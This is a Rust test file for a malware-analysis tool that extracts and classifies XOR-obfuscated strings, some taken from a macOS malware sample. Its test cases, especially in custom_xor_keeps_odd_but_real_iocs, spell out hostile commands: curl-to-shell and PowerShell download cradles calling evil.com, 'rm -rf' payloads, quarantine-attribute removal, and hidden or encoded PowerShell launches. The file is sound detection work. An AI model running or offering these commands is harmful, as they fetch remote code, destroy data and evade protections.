use super::scan::{extract_custom_xor_strings, extract_rolling_xor_with_known_plaintext};
use crate::StringKind;

#[test]
fn custom_xor_results_do_not_overlap() {
    // Test that we don't extract overlapping strings from the same data region
    // Real issue: "fxattr" at 496f3 and "xattr" at 496f4 (overlapping in source)
    let key_string = "fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";
    let key_bytes = key_string.as_bytes();

    let plaintext = b"xattr -d com.apple.quarantine";

    // Create data with the string XOR'd at position 50
    let mut data = vec![0xFF; 200];
    for (i, &b) in plaintext.iter().enumerate() {
        data[50 + i] = b ^ key_bytes[i % key_bytes.len()];
    }

    let results = extract_custom_xor_strings(&data, key_bytes, 10, false);

    // Check for overlapping strings (same data region decoded multiple times)
    for i in 0..results.len() {
        for j in (i + 1)..results.len() {
            let start1 = usize::try_from(results[i].data_offset).unwrap_or(usize::MAX);
            let end1 = start1 + results[i].value.len();
            let start2 = usize::try_from(results[j].data_offset).unwrap_or(usize::MAX);
            let end2 = start2 + results[j].value.len();

            // Check if ranges overlap
            let overlaps = !(end1 <= start2 || end2 <= start1);

            assert!(
                !overlaps,
                "Found overlapping strings: '{}' at {}..{} and '{}' at {}..{}",
                results[i].value, start1, end1, results[j].value, start2, end2
            );
        }
    }
}

#[test]
fn custom_xor_finds_sleep_at_true_start() {
    // Test that "sleep 3; rm -rf '%s'" is extracted at the correct offset
    // This was a real bug where "eep 3; rm -rf '%s'" was extracted instead
    // because the step size skipped the actual start position

    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";

    // The actual command that should be found
    let expected = "sleep 3; rm -rf '%s'";

    // XOR encode it
    let xored: Vec<u8> = expected
        .as_bytes()
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect();

    // Create test data with the string at a position that's not divisible by 4
    // to ensure we catch it even with step scanning
    let mut data = vec![0xFF; 100];
    data.extend_from_slice(&xored);
    data.extend_from_slice(&[0xFF; 100]);

    let results = extract_custom_xor_strings(&data, key, 10, false);

    // Should find the complete sleep command
    let found = results.iter().any(|r| r.value == expected);
    assert!(
        found,
        "Should extract complete sleep command '{}', found: {:?}",
        expected,
        results.iter().map(|r| &r.value).collect::<Vec<_>>()
    );

    // Should NOT find truncated version
    let found_truncated = results
        .iter()
        .any(|r| r.value.starts_with("eep ") && !r.value.starts_with("sleep"));
    assert!(
        !found_truncated,
        "Should not extract truncated 'eep' version"
    );
}

#[test]
fn brew_agent_open_command_is_whole() {
    // Test extraction from actual brew_agent binary at offset 0x4b115
    // Should find: 'open -a /bin/bash --args -c "sleep 3; rm -rf \'%s\'"'
    // Bug: Currently finding "ep 3; rm -rf '%s" at 0x4b135 instead

    {
        let data = crate::test_fixture("testdata/malware/brew_agent");
        let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";
        let results = extract_custom_xor_strings(data, key, 10, false);

        // Check what we found in the region 0x4b100-0x4b200
        let in_region: Vec<_> = results
            .iter()
            .filter(|r| r.data_offset >= 0x4b100 && r.data_offset < 0x4b200)
            .collect();

        // Should find the full "open -a /bin/bash" command starting at 0x4b115
        let found_open_cmd = in_region
            .iter()
            .any(|r| r.value.contains("open -a /bin/bash") && r.value.contains("sleep 3"));

        // Should find sleep command (either standalone or as part of open command)
        let found_sleep = in_region.iter().any(|r| r.value.contains("sleep 3"));

        // Should NOT find truncated "eep 3" without the "sl" prefix
        let found_truncated = in_region.iter().any(|r| {
            r.value.starts_with("eep 3")
                || (r.value.contains("eep 3") && !r.value.contains("sleep 3"))
        });

        assert!(found_sleep, "no 'sleep 3' in region: {in_region:?}");
        assert!(
            found_open_cmd,
            "no full 'open -a /bin/bash' command at 0x4b115: {in_region:?}"
        );
        assert!(
            !found_truncated,
            "truncated 'eep 3' without 'sleep': {in_region:?}"
        );
    }
}

#[test]
fn custom_xor_rejects_brew_agent_garbage() {
    // Test that garbage strings are properly rejected
    // These are real examples from brew_agent that should be filtered
    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";

    let garbage_examples = vec![
        "14; 5s$!>g",
        "%+. >#B3<S",
        "dA:+<<7)^V",
        "dA:+<<7)^9N",
        "dA:+=*&$Z%:=V",
        "eA:+=*&<B#'77",
        "drUvhNSNP)ZBO+^",
        "rUvhNSNP)ZBO+^",
        "{YztDORL*VNS",
        "5/;:#G?:*71",
        "%+. >#B3<Sh",
        ".O3<<71 9'R",
        "2z+<<7)^9N",
    ];

    for garbage in &garbage_examples {
        // XOR encode it
        let xored: Vec<u8> = garbage
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ key[i % key.len()])
            .collect();

        let mut data = vec![0x00; 20];
        data.extend_from_slice(&xored);
        data.extend_from_slice(&[0x00; 20]);

        let results = extract_custom_xor_strings(&data, key, 10, false);

        // These garbage strings should NOT be extracted
        assert!(
            !results.iter().any(|r| r.value == *garbage),
            "garbage {garbage:?} was extracted"
        );
    }
}

#[test]
fn custom_xor_classifies_paths() {
    let key = b"KEY";

    // Test valid multi-level paths
    let path1 = b"/usr/bin/bash";
    let xored1: Vec<u8> = path1
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect();
    let results1 = extract_custom_xor_strings(&xored1, key, 4, false);
    assert!(
            results1
                .iter()
                .any(|r| r.kind == Some(StringKind::Path)
                    || r.kind == Some(StringKind::SuspiciousPath)),
            "/usr/bin/bash should be detected as path or suspicious path. Found: {:?}",
            results1
                .iter()
                .map(|r| (&r.value, &r.kind))
                .collect::<Vec<_>>()
        );

    // Test /etc/passwd
    let path2 = b"/etc/passwd";
    let xored2: Vec<u8> = path2
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect();
    let results2 = extract_custom_xor_strings(&xored2, key, 4, false);
    assert!(
            results2
                .iter()
                .any(|r| r.kind == Some(StringKind::Path)
                    || r.kind == Some(StringKind::SuspiciousPath)),
            "/etc/passwd should be detected as path"
        );

    // Test /dev/urandom
    let path3 = b"/dev/urandom";
    let xored3: Vec<u8> = path3
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect();
    let results3 = extract_custom_xor_strings(&xored3, key, 4, false);
    assert!(
        results3.iter().any(|r| r.kind == Some(StringKind::Path)),
        "/dev/urandom should be detected as path"
    );
}

#[test]
fn custom_xor_keeps_odd_but_real_iocs() {
    // Test that bizarre but legitimate IOCs pass through the filter
    // This ensures high-value patterns bypass strict filtering
    let key = b"TESTKEY";

    let test_cases = vec![
        // Shell redirections with special chars
        ("osascript 2>&1 <<EOD", "heredoc with redirect"),
        ("bash -c 'curl http://evil.com | sh'", "pipe in shell"),
        (
            "python -c \"import os; os.system('ls')\"",
            "python one-liner",
        ),
        ("sleep 3; rm -rf /tmp/bad", "sleep and rm commands"),
        (
            "open -a /bin/bash --args -c \"sleep 3; rm -rf '%s'\"",
            "macOS open with nested shell command",
        ),
        // Complex paths with special chars
        (
            "/usr/bin/python -m http.server 8080",
            "python command with args",
        ),
        // URLs with ports and special chars
        ("https://192.168.1.1:8080/api/v1", "URL with IP and port"),
        ("http://evil.com:443/path", "URL with port"),
        // IP addresses (need alphabetic context - pure numeric IPs are filtered out to avoid false positives)
        ("Server:192.168.1.100", "IP address with context"),
        ("Connect:45.33.32.156", "IP address with context"),
        // Unicode escapes (legitimate obfuscation)
        ("decode\\x20this\\x20data", "hex escape sequences"),
        ("string\\u0041test", "unicode escape"),
        // Shell commands with special chars that are NOT garbage
        ("xattr -d com.apple.quarantine", "xattr command"),
        ("curl -X POST -H 'Content-Type: json'", "curl with headers"),
        ("/bin/bash -c 'echo test'", "bash command"),
        ("perl -e 'print \"test\"'", "perl one-liner"),
        // PowerShell examples (Windows malware patterns)
        (
            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\"",
            "powershell download cradle",
        ),
        (
            "powershell -ExecutionPolicy Bypass -File script.ps1",
            "powershell bypass execution policy",
        ),
        (
            "powershell -encodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
            "powershell encoded command",
        ),
        (
            "cmd.exe /c powershell -nop -w hidden -c IEX",
            "cmd.exe launching powershell",
        ),
        // JavaScript/Node.js examples (obfuscated malware patterns)
        (
            "eval(atob('ZG9jdW1lbnQubG9jYXRpb24uaHJlZg=='))",
            "javascript eval with base64",
        ),
        (
            "require('child_process').exec('curl http://evil.com')",
            "nodejs child_process exec",
        ),
        (
            "Function('return this')().eval('malicious code')",
            "javascript obfuscated eval",
        ),
    ];

    for (plaintext, description) in test_cases {
        let xored: Vec<u8> = plaintext
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ key[i % key.len()])
            .collect();

        let results = extract_custom_xor_strings(&xored, key, 10, false);
        let found = !results.is_empty();

        assert!(
            found,
            "Should PASS: '{}' - {} (got {} results)",
            plaintext,
            description,
            results.len()
        );
    }
}

#[test]
fn rolling_xor_finds_single_byte_key() {
    // Test rolling XOR with a single-byte key
    let key = [0x42u8];
    let pattern1 = b"%USERPROFILE%";
    let pattern2 = b"HKEY_CURRENT_USER";

    // Create data with both patterns XOR'd
    let mut data = vec![0x00u8; 200];

    // XOR pattern1 at offset 30
    for (i, &b) in pattern1.iter().enumerate() {
        data[30 + i] = b ^ key[0];
    }

    // XOR pattern2 at offset 80
    for (i, &b) in pattern2.iter().enumerate() {
        data[80 + i] = b ^ key[0];
    }

    let results = extract_rolling_xor_with_known_plaintext(&data, 8, &[]);

    // Should find the patterns
    let found_userprofile = results.iter().any(|r| r.value.contains("USERPROFILE"));
    let found_hkey = results.iter().any(|r| r.value.contains("HKEY"));

    assert!(
        found_userprofile || found_hkey,
        "Should detect at least one pattern with rolling XOR. Results: {:?}",
        results.iter().map(|r| &r.value).collect::<Vec<_>>()
    );
}

#[test]
fn rolling_xor_region_decodes_with_key_aligned_to_match() {
    // A 3-byte key, and anchors 4 KB in: the decoded region starts 4096
    // bytes before the match, which is not a multiple of the key length.
    let key = [0x01, 0x02, 0x03];
    let mut data = vec![0u8; 10_000];
    for (at, text) in [
        (5003, &b"%USERPROFILE%\\Documents\\stealer.log"[..]),
        (5204, &b"HKEY_CURRENT_USER\\Software\\Run"[..]),
    ] {
        for (i, &b) in text.iter().enumerate() {
            data[at + i] = b ^ key[i % key.len()];
        }
    }
    let values: Vec<String> = extract_rolling_xor_with_known_plaintext(&data, 8, &[])
        .into_iter()
        .map(|s| s.value)
        .collect();
    assert!(
        values.contains(&"%USERPROFILE%\\Documents\\stealer.log".to_owned()),
        "{values:?}"
    );
    assert!(
        values.contains(&"HKEY_CURRENT_USER\\Software\\Run".to_owned()),
        "{values:?}"
    );
}

#[test]
fn rolling_xor_quiet_on_noise() {
    // Random data should not produce false positives
    let data: Vec<u8> = (0..500u32)
        .map(|i| u8::try_from((i * 17 + 31) % 256).unwrap_or(0))
        .collect();
    let results = extract_rolling_xor_with_known_plaintext(&data, 8, &[]);

    // Should have few or no results on random data
    assert!(
        results.len() < 5,
        "Should have few false positives on random data. Got {} results",
        results.len()
    );
}

#[test]
fn short_credential_words_must_be_words() {
    use crate::xor::classify::{Verdict, classify_xor_string};
    let kind = |s| match classify_xor_string(s) {
        Verdict::Keep(kind) => kind,
        Verdict::Reject => None,
    };
    assert_eq!(
        kind("n+++%s^userContextId=1"),
        Some(crate::StringKind::SuspiciousPath)
    );
    assert_eq!(kind("root:x:0:0"), Some(crate::StringKind::SuspiciousPath));
    assert_ne!(kind("yyrkeychbyy"), Some(crate::StringKind::SuspiciousPath));
}
